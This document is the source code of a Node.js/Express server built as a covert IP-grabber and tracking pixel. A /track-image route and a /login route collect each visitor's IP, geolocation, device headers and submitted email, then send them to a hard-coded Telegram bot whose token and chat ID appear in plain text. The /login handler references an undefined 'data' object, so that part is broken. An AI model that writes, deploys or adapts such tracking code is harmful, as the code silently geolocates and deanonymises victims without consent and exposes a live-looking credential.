const express = require("express");
const axios = require("axios");
const fs = require("fs");
const path = require("path");
const app = express();

const port = process.env.PORT || 3000;

const telegramBotToken = "8054463444:AAGU44U27Hly1LPgMqM2H_5fYwVQCbgLFME";
const telegramChatId = "1387832458";

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.get("/", (req, res) => {
  res.redirect("/track-image");
});

// app.get("/", (req, res) => {
//   res.sendFile(path.join(__dirname, "login.html"));
// });

app.post("/login", async (req, res) => {
  const { email } = req.body;

  const rawIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const ip = rawIp.split(",")[0].trim();
  const timestamp = new Date().toISOString();
  const log = `Email: ${email} | IP: ${ip} | Time: ${timestamp}\n`;

  fs.appendFile("ip_logs.txt", log, (err) => {
    if (err) console.error("Error saving log:", err);
  });

  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    if (response.data.status === "fail") {
      throw new Error(`API failed: ${response.data.message}`);
    }

    const {
      country,
      countryCode,
      region,
      regionName,
      city,
      zip,
      lat,
      lon,
      timezone,
      isp,
      org,
      as,
    } = response.data;

    const userAgent = req.headers["user-agent"] || "Unknown";
    const language = req.headers["accept-language"] || "Unknown";
    const referer = req.headers["referer"] || "Direct Link";
    const connection = req.headers["connection"] || "Unknown";
    const host = req.headers["host"] || "Unknown";
    const locationLink = `https://www.google.com/maps?q=${data.lat},${data.lon}`;

    const message = `
    📍 New Visitor Tracked:
    IP: ${ip}
    Country: ${data.country} (${data.countryCode})
    Region: ${data.regionName}
    City: ${data.city}
    ZIP: ${data.zip}
    🌐 Location: [Open Map](${locationLink})
    Lat, Lon: ${data.lat}, ${data.lon}
    Timezone: ${data.timezone}
    ISP: ${data.isp}
    Org: ${data.org}
    ASN: ${data.as}
    User-Agent: ${userAgent}
    Language: ${language}
    Referer: ${referer}
    Timestamp: ${timestamp}
    `;

    await axios.get(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        params: {
          chat_id: telegramChatId,
          text: message,
          parse_mode: "Markdown",
        },
      }
    );

    await axios.get(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        params: {
          chat_id: telegramChatId,
          text: message,
        },
      }
    );

    res.redirect("https://google.com");
  } catch (err) {
    console.error("Error:", err.message);
    await axios.get(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        params: {
          chat_id: telegramChatId,
          text: `❌ Error fetching info for IP: ${ip} - ${err.message}`,
        },
      }
    );
    res.send("Error occurred.");
  }
});

app.get("/track-image", async (req, res) => {
  const rawIp = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const ip = rawIp.split(",")[0].trim();
  const timestamp = new Date().toISOString();

  try {
    const response = await axios.get(`http://ip-api.com/json/${ip}`);
    if (response.data.status === "fail") {
      throw new Error(`API failed: ${response.data.message}`);
    }

    const {
      country,
      countryCode,
      region,
      regionName,
      city,
      zip,
      lat,
      lon,
      timezone,
      isp,
      org,
      as,
    } = response.data;

    const userAgent = req.headers["user-agent"] || "Unknown";
    const language = req.headers["accept-language"] || "Unknown";
    const referer = req.headers["referer"] || "Direct Link";
    const connection = req.headers["connection"] || "Unknown";
    const host = req.headers["host"] || "Unknown";

    const message = `
📸 Image Tracker Triggered
🌐 IP: ${ip}
📍 Location: ${city}, ${regionName}, ${country} (${countryCode})
🗺️ Lat: ${lat}, Lon: ${lon}
🏢 ISP: ${isp}, Org: ${org}
🕒 Time: ${timestamp}
💻 Device: ${userAgent}
🌍 Language: ${language}
🔗 Referer: ${referer}
🔌 Connection: ${connection}
🧑‍💻 Host: ${host}
    `;

    await axios.get(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        params: {
          chat_id: telegramChatId,
          text: message,
        },
      }
    );
  } catch (err) {
    console.error("Error:", err.message);
    await axios.get(
      `https://api.telegram.org/bot${telegramBotToken}/sendMessage`,
      {
        params: {
          chat_id: telegramChatId,
          text: `❌ Error fetching info for IP: ${ip} - ${err.message}`,
        },
      }
    );
  }

  res.sendFile(__dirname + "/image.jpg");
});

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});
